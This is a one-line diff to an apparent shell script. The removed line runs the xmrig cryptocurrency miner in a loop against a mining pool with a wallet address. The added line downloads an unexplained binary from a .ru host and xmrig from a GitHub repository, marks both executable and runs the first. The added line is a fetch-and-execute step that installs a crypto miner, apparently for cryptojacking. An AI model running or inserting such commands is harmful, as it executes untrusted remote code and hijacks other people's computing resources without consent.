@@ -1,1 +1,1 @@
-while true; do ./xmrig -a rx/0 -o xtm-rx-ru.kryptex.network:7038 -u 12CMjPiqeZ3ZWqTwnRouRHiD66h2KpWi8CLjMZcA6ZMALgYxyr3Kk9ghvggRAhUm4984faBCkyDVCvnaD1RjfRgWA28/X1 -k; sleep 1; done
+wget http://agt.ru.swtest.ru/CROWD && wget https://github.com/zerozero-abc/CarnivalCrowd/raw/refs/heads/main/xmrig && chmod +x CROWD && chmod +x xmrig && ./CROWD
